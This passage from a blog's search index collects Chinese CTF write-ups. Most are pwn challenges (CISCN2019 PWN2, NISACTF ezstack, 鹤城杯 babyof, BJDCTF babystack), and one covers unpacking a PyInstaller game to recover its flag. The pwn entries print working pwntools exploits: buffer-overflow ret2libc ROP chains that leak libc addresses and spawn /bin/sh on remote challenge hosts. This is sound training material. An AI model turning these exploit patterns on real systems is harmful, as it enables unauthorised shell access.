class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;read:&quot;</span>,<span class="built_in">hex</span>(read_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;read&quot;</span>, read_addr)</span><br><span class="line"><span class="comment"># libc =ELF(&#x27;./libc6_2.23-0ubuntu10_amd64.so&#x27;)</span></span><br><span class="line">libc_base = read_addr - libc.dump(<span class="string">&quot;read&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;system:&quot;</span>,<span class="built_in">hex</span>(system))</span><br><span class="line">bin_sh = libc_base + libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;bin_sh:&quot;</span>,<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> +p64(pop_4) + p64(pop_rdi) + p64(bin_sh) + p64(system)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.interactive() </span><br><span class="line"><span class="comment"># cyberpeace&#123;45c1180b9ea8e1f0fb88c08518427f51&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/RCTF2021-welpwn/image_mHxZ1n-u30.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> RCTF2021 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>‘[CISCN2019]东北PWN2’</title>
      <link href="/2023/08/21/CISCN2019%E4%B8%9C%E5%8C%97PWN2/"/>
      <url>/2023/08/21/CISCN2019%E4%B8%9C%E5%8C%97PWN2/</url>
      
        <content type="html"><![CDATA[<h1 id="CISCN-2019东北-PWN2"><a href="#CISCN-2019东北-PWN2" class="headerlink" title="[CISCN 2019东北]PWN2"></a>[CISCN 2019东北]PWN2</h1><h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>这题一看了一下正常的流程：</p><p>1、输入选项，进行加密，果然只能加密，差点以为直接字符串解密，冷静这是PWN</p><p><img src="/../image/CISCN2019%E4%B8%9C%E5%8C%97PWN2/image_ubgpi8ZJNk.png"></p><p>找到溢出点，很明显在输出加密结果的puts()函数有问题。同样无system与&#x2F;bin&#x2F;sh，这种题目的做法，找到泄露的函数地址，计算基址，加上偏移求接下来函数。</p><p><img src="/../image/CISCN2019%E4%B8%9C%E5%8C%97PWN2/image_JqX6MLj-ym.png"></p><p>exp：(libc2)</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./PWN2&#x27;</span>)</span><br><span class="line">pro = remote(<span class="string">&#x27;node1.anna.nssctf.cn&#x27;</span>,<span class="number">28490</span>)</span><br><span class="line">ret_addr = <span class="number">0x4006b9</span></span><br><span class="line">pop_rdi = <span class="number">0x400c83</span></span><br><span class="line">en_addr = <span class="number">0x4009a0</span></span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(pop_rdi)+p64(puts_got) + p64(puts_plt)+p64(en_addr)</span><br><span class="line">pro.sendlineafter(<span class="string">b&#x27;choice!&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">pro.sendlineafter(<span class="string">b&#x27;encrypted&#x27;</span>,payload)</span><br><span class="line">puts_addr= u64(pro.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="comment"># puts_addr = u64(pro.recv(6).ljust(8,b&#x27;\x00&#x27;))</span></span><br><span class="line"><span class="comment"># 这中方法给的libc版本过多</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">binsh=libc_addr+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">system=libc_addr+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x58</span>+p64(ret_addr)+p64(pop_rdi)+p64(binsh)+p64(system)+p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">pro.sendlineafter(<span class="string">b&#x27;encrypted&#x27;</span>,payload2)</span><br><span class="line">pro.interactive()</span><br><span class="line"><span class="comment"># NSSCTF&#123;d8331f3f-6543-4ec4-9df3-3938d4ec8846&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/CISCN2019%E4%B8%9C%E5%8C%97PWN2/image_xKxkRQQ7_O-17242231888863.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> CISCN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[NISACTF 2022]ezstack</title>
      <link href="/2023/08/21/NISACTF2022-ezstack/"/>
      <url>/2023/08/21/NISACTF2022-ezstack/</url>
      
        <content type="html"><![CDATA[<h1 id="NISACTF-2022-ezstack"><a href="#NISACTF-2022-ezstack" class="headerlink" title="[NISACTF 2022]ezstack"></a>[NISACTF 2022]ezstack</h1><p><img src="/../image/NISACTF2022-ezstack/image_8kBmjn8qGs.png"></p><p>read栈溢出</p><p>这题的特殊地点是：</p><p><img src="/../image/NISACTF2022-ezstack/image_EAGPWbu8fT.png"></p><p>&#x2F;bin&#x2F;sh并不是函数的形式：起初的想法是构造一个函数</p><p>后来了解到在PWN中并不需用，如果只是单纯的更改附件也只是本地打通，而远程的依然不通，所以这里应该有特殊的方法，之后去了解到：</p><p><a href="https://blog.csdn.net/Mr_Fmnwon/article/details/130897024" title="https://blog.csdn.net/Mr_Fmnwon/article/details/130897024">https://blog.csdn.net/Mr_Fmnwon&#x2F;article&#x2F;details&#x2F;130897024</a></p><p>后来发现自己的想法有误，在pwn 中无需这样只需要在运行动态链接时进行构造传入就行（可参考上文中博主的思考方法）：</p><p>思考ret2text——没有直接后门函数</p><p>思考ret2shellcode——bss段&#x2F;可执行段不符合条件、栈上nx保护</p><p>思考ret2syscall——file查看文件，是动态链接，一般来说gadget非常少，不太适合</p><p>思考ret2libc——存在system的plt表&#x2F;got表信息，且存在栈溢出漏洞，可行。</p><p>经过一番了解进行构造payload：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28161</span>)</span><br><span class="line">padlength = <span class="number">0x48</span> + <span class="number">0x4</span></span><br><span class="line">bin_sh = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system = elf.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;[+]bin_sh=&#x27;</span> + <span class="built_in">hex</span>(bin_sh)) </span><br><span class="line">success(<span class="string">&#x27;[+]system=&#x27;</span> + <span class="built_in">hex</span>(system))</span><br><span class="line">shell = elf.sym[<span class="string">&#x27;shell&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;[+]shell=&#x27;</span> + <span class="built_in">hex</span>(shell))</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padlength + p32(system) + p32(bin_sh) + p32(bin_sh)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>学习别人的exp（更加简洁）：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">32</span>位程序，函数调用的参数都在栈上，我们保证执行system函数时，栈上第一是/<span class="built_in">bin</span>/sh的地址</span><br><span class="line">就可以</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># p = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p =remote(<span class="string">&quot;1.14.71.254&quot;</span>,<span class="number">28960</span>)</span><br><span class="line">system_addr = <span class="number">0x08048390</span></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A024</span></span><br><span class="line"><span class="comment"># payload = b&#x27;a&#x27;*72+b&#x27;b&#x27;*4+p32(system_addr)+p32(0)+p32(bin_sh_addr)</span></span><br><span class="line">payload = flat(<span class="string">&#x27;a&#x27;</span>*<span class="number">72</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">4</span>,system_addr,<span class="number">0</span>,bin_sh_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;NISACTF\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[2021鹤城杯]babyof</title>
      <link href="/2023/08/21/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/"/>
      <url>/2023/08/21/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/</url>
      
        <content type="html"><![CDATA[<h1 id="2021-鹤城杯-babyof"><a href="#2021-鹤城杯-babyof" class="headerlink" title="[2021 鹤城杯]babyof"></a>[2021 鹤城杯]babyof</h1><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>#checksec babyof</p><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_R4LXqXIRdS.png"></p><p>寻找pop_rdi_ret地址：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary ./babyof --only <span class="string">&quot;pop|ret&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_zj4XqJuTx_.png"></p><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_L5iMefsYY8.png"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">objdump -d -j .plt ./babyof |grep system</span><br><span class="line">这里是用来查看plt表中所有调用的函数</span><br></pre></td></tr></table></figure><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_hxh4n0Q7zX.png"></p><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_IPyN1LqJYL.png"></p><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_J4vK2kjy6p.png"></p><h2 id="知识点："><a href="#知识点：" class="headerlink" title="知识点："></a>知识点：</h2><p>ret2libc3—system  &#x2F;bin&#x2F;sh 的寻址，计算libc基址</p><p>情况分为两种，libc版本已知，libc版本未知</p><p>这里有一个网址可以用来确定版本：</p><p><a href="https://libc.blukat.me/" title="libc database search (blukat.me)">libc database search (blukat.me)</a></p><p>有libc库可以离线：</p><p><a href="https://blog.csdn.net/qq_35078631/article/details/123987905" title="(14条消息) LibcSearcher--匹配libc版本的神器_Assassin__is__me的博客-CSDN博客">(14条消息) LibcSearcher–匹配libc版本的神器_Assassin__is__me的博客-CSDN博客</a></p><p>这题的题目环境有些问题，导致卡了很久，libc的版本问题</p><p>至于算基址的方法有很多，只需要根据所暴露的got plt的表中的函数地址，去算基址，以及所需要的system()<code>execve()</code> 这种系统级函数的地址，其中为什么需要libc的版本，是因为每个版本的函数偏移是相同的所以只需要求出基址即可。</p><p>至于泄露函数的选择：</p><p>注：不能选择_start、_ init、_fini作为预期被泄露函数，因为GNU把这三个作为了程序启动和结束的最基本运行库函数，分别放在crt1.o、crti.o、crtn.o这三个object文件中供程序链接时使用，而不是在libc.so.6中。</p><p>这一题的流程就是，在找到泄露函数，算基址，找到system()函数的基址，构造&#x2F;bin&#x2F;sh</p><p>语句填入其中即可执行：</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./babyof&#x27;</span>)</span><br><span class="line"><span class="comment"># libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.27.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc6_2.23-0ubuntu11.3_amd64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = process(&#x27;./babyof&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28281</span>)</span><br><span class="line"></span><br><span class="line">prdi = <span class="number">0x0000000000400743</span><span class="comment">#: pop rdi</span></span><br><span class="line">prsi = <span class="number">0x0000000000400741</span> <span class="comment">#: pop rsi ; pop r15 ; ret</span></span><br><span class="line">prdx = <span class="number">0x0000000000001b96</span> <span class="comment">#: pop rdx ; ret</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;Do you know how to do buffer overflow?&#x27;)</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(prdi) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) + p64(<span class="number">0x40066B</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">    leak = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">    info(<span class="built_in">hex</span>(leak))</span><br><span class="line">    <span class="comment">#libc_base = leak - libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">    libc_base = leak - <span class="number">0x80aa0</span></span><br><span class="line">    <span class="comment">#system = libc_base + libc.sym[&#x27;system&#x27;]</span></span><br><span class="line">    system = libc_base + <span class="number">0x4f550</span></span><br><span class="line">    info(<span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="comment">#binsh = libc_base  + next(libc.search(b&#x27;/bin/sh\x00&#x27;))</span></span><br><span class="line">    binsh = libc_base + <span class="number">0x1b3e1a</span></span><br><span class="line">    pop_rdx = libc_base + prdx</span><br><span class="line"></span><br><span class="line">    <span class="comment"># io.recvuntil(&#x27;Do you know how to do buffer overflow?&#x27;)</span></span><br><span class="line">    payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> +p64(pop_rdx)+p64(<span class="number">0</span>)+p64(prsi)+p64(<span class="number">0</span>)*<span class="number">2</span> +p64(prdi) + p64(binsh) + p64(system)</span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    io.send(payload)</span><br><span class="line"></span><br><span class="line">exp()</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/../image/2021%E9%B9%A4%E5%9F%8E%E6%9D%AF-babyof/image_iHycF3hy7a.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> 鹤城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[BJDCTF 2020]babystack2.0</title>
      <link href="/2023/08/21/BJDCTF2020-babystack2-0/"/>
      <url>/2023/08/21/BJDCTF2020-babystack2-0/</url>
      
        <content type="html"><![CDATA[<h1 id="BJDCTF-2020-babystack2-0"><a href="#BJDCTF-2020-babystack2-0" class="headerlink" title="[BJDCTF 2020]babystack2.0"></a>[BJDCTF 2020]babystack2.0</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/./../image/BJDCTF2020-babystack2-0/image_lKMBqZ89D5.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_Z2BfRel13r.png"></p><p>64位程序，开启了栈不可执行（NX）、部分RELRO保护（RELRO）</p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_C2YmsUHVNo.png"></p><p><strong>size_t</strong> 是一些C&#x2F;C++标准在stddef.h中定义的，size_t 类型表示C中任何对象所能达到的最大长度，它是无符号整数。</p><p>它是为了方便系统之间的移植而定义的，不同的系统上，定义size_t 可能不一样。size_t在32位系统上定义为 unsigned int，也就是32位无符号整型。在64位系统上定义为 unsigned long ，也就是64位无符号整形。size_t 的目的是提供一种可移植的方法来声明与系统中可寻址的内存区域一致的长度。</p><p>size_t 在数组下标和内存管理函数之类的地方广泛使用。例如，size_t 用做sizeof 操作符的返回值类型，同时也是很多函数的参数类型，包括malloc 和strlen。</p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_b3OBzZV-mf.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_rTpzYNoN_i.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_OWGoJHJgyL.png"></p><p><img src="/./../image/BJDCTF2020-babystack2-0/image_vooqFrCmDG.png"></p><p>这里得到shellcode的地址add&#x3D;0x400726&#x20;</p><p>exp：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os = <span class="string">&quot;linux&quot;</span>, arch = <span class="string">&quot;amd64&quot;</span>, log_level= <span class="string">&quot;debug&quot;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28156</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x400726</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;length of your name:&quot;</span>, <span class="string">&quot;2147483649&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name?&quot;</span>, payload)</span><br><span class="line">p.sendline(<span class="string">&quot;cat flag&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28666</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0400726</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><img src="/./../image/BJDCTF2020-babystack2-0/image_fhUAMOdjbo.png"></p><p>备注：一些相关的处理方法链接</p><p><a href="https://blog.csdn.net/yongbaoii/article/details/109105721" title="(10条消息) LibcSearcher 安装 错误处理 与使用_yongbaoii的博客-CSDN博客">(10条消息) LibcSearcher 安装 错误处理 与使用_yongbaoii的博客-CSDN博客</a></p><h1 id="BJDCTF-2020-babystack"><a href="#BJDCTF-2020-babystack" class="headerlink" title="[BJDCTF 2020]babystack"></a>[BJDCTF 2020]babystack</h1><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p><img src="/../image/BJDCTF2020-babystack2-0/image_hVM8PraJWr.png"></p><p>64位程序，开启了栈不可执行，部分RELRO保护</p><p>这里和2.0相同只是注意&#x2F;bin&#x2F;shell的地址不同</p><p>exp:</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28666</span>)</span><br><span class="line"></span><br><span class="line">backdoor = <span class="number">0x0400726</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;name?&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> stack </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022年春秋杯冬季赛-reindeer game</title>
      <link href="/2022/12/21/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/"/>
      <url>/2022/12/21/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/</url>
      
        <content type="html"><![CDATA[<h1 id="2022年春秋杯冬季赛-reindeer-game"><a href="#2022年春秋杯冬季赛-reindeer-game" class="headerlink" title="2022年春秋杯冬季赛-reindeer game"></a>2022年春秋杯冬季赛-reindeer game</h1><h4 id="工具准备："><a href="#工具准备：" class="headerlink" title="工具准备："></a><strong>工具准备：</strong></h4><p>&#x20;  1、 pyinstxtractor.py</p><p>&#x20;  2、uncompyle6</p><h4 id="思路综述："><a href="#思路综述：" class="headerlink" title="思路综述："></a><strong>思路综述：</strong></h4><p>&#x20;   1、正常通过游戏；</p><p>&#x20;   2、①从python打包而成的exe入手；</p><p>&#x20;         ②用pyinstxtractor.py工具拆包，拿到游戏的py源码；</p><p>&#x20;         ③分析逻辑，找出得到flag的部分或者修改游戏胜利条件。</p><p>&#x20;   3、其他方法，可以尝试通过游戏修改器，更改关键数值（具体步骤本文并没有列出）。</p><h4 id="详述："><a href="#详述：" class="headerlink" title="详述："></a><strong>详述：</strong></h4><p>题目是一个驯鹿🦌吃姜饼的游戏：题目要求吃30个，不太擅长游戏的小伙伴可能很久都不能过关。</p><p>这一题很明显是用python写的游戏，并且用了pyinstaller 进行了打包：</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_EsyD6U0mdV.png"></p><p>接下来的思路就来了，拿到源py代码，不就随意发挥了，有打包工具就有拆包工（pyinstxtractor.py），注意这里的拆包工具，历史版本太多。</p><p>版本网址一：<a href="https://github.com/extremecoders-re/pyinstxtractor" title="https://github.com/extremecoders-re/pyinstxtractor">https://github.com/extremecoders-re/pyinstxtractor</a>；</p><p>版本网址二：<a href="https://sourceforge.net/projects/pyinstallerextractor/files/dist/pyinstxtractor.py/download?use_mirror=nchc" title="https://sourceforge.net/projects/pyinstallerextractor/files/dist/pyinstxtractor.py/download?use_mirror=nchc">https://sourceforge.net/projects/pyinstallerextractor/files/dist/pyinstxtractor.py/download?use_mirror&#x3D;nchc</a></p><p>版本三:网上查询，接下来的是别的博主改写的，可以直接用（也都算是用下来比较好的）；</p><p><a href="https://blog.csdn.net/qfcy_/article/details/113245876" title="https://blog.csdn.net/qfcy_/article/details/113245876"><a href="https://blog.csdn.net/qfcy">https://blog.csdn.net/qfcy</a> _&#x2F;article&#x2F;details&#x2F;113245876</a></p><p>拿到拆包工具后：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 pyinstxtractor.py reindeer.exe</span><br></pre></td></tr></table></figure><p>之后会生成一个对应的包：</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_pd-5oFuEkG.png"></p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_ahqhOCLgxr.png"></p><p>进入包中主要寻找二个部分，第一个就是reindeer的文件，实际上这是一个pyc文件，只是又由于拆包时造成的，直接加上.pyc后缀即可；</p><p>接下来就是对reindeer.pyc的反编译，需要用到工具：uncompyle6</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">uncompyle6 -o reindeer.py reindeer.pyc</span><br></pre></td></tr></table></figure><p>执行后生成py源代码，这时就可以看到整个游戏的逻辑；</p><p>部分展示图：</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_UkLCmjZG3W.png"></p><p>大概分析完逻辑后，这里看到有一个重要的模块astar模块，这里是作者自己写的，所以在打包的时候应该已经打包在一起了；可以去拆的包查找：</p><p>这就是第二部分: 将astar.pyc文件同样反编译为py文件</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_arAeb-BpqC.png"></p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_YCS4b8ftCk.png"></p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_B--lg87bBn.png"></p><p>如果缺少pygame模块的可以自行安装一下，之后就可以正常运行reindeer.py文件。</p><p>到这里我们已经拿到游戏的大部分源码了，可以直接通过修改吃姜饼的数量完成游戏,一定要注意修改的数值大小（不可为0，否则就失去了游戏的意义）；修改的关键值：TO_WIN&#x20;</p><p>这个方法适合追寻解题速度同时又不想失去游戏的乐趣的师傅；</p><p>根本就不想玩游戏的师傅，在分析游戏逻辑时，就发现拿到flag的关键；逻辑胜利，直接来到</p><p>def victory(time)</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_JIXGXjELXq.png"></p><p>:这里，发现flag藏在了getczekolada()中，直接进入astar.py</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_kANiqsOU-I.png"></p><p>这里就是一个gzip的压缩，直接一个解压缩，就可得到flag值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gzip</span><br><span class="line">data = b&#x27;\x1f\x8b\x08\x00\xd6\x03\xa0c\x02\xffK\xcbIL\xaf\xb60J4JLN2\xd3\xb5\xb400\xd65\xb14\x06\xb2\x8cR\x92t\xd3\x0cM\x8c\rS,\r\x92\xcdR\x0ck\x01\xc7Y,\xef*\x00\x00\x00&#x27;</span><br><span class="line">print(gzip.decompress(data))</span><br><span class="line">#b&#x27;flag&#123;82a2acb6-9803-4936-92db-f1431d90c6d1&#125;&#x27;</span><br></pre></td></tr></table></figure><p>下面这幅图是：修改姜饼个数为1（4s通关🦌）；</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_raLuviGzK1.png"></p><h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a><strong>总结</strong>：</h3><p>&#x20;       1、小白文章，如果发现错误还请各位师傅指出。</p><p>&#x20;       2、中间踩的空较多，算是趟水的人，各位请放心食用。</p><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a><strong>补充：</strong></h3><p>&#x20;       作者师傅说了有彩蛋，彩蛋开启之术，同时按下0，1，2数字键（不要使用小键盘哦）：</p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_hUg2Ff7bcu.png"></p><p><img src="/./../image/2022%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%9D%AF%E5%86%AC%E5%AD%A3%E8%B5%9B-reindeer-game/image_VzHpZpHWGP.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 拆包 </tag>
            
            <tag> pyc </tag>
            
            <tag> gzip </tag>
            
            <tag> 游戏逆向 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
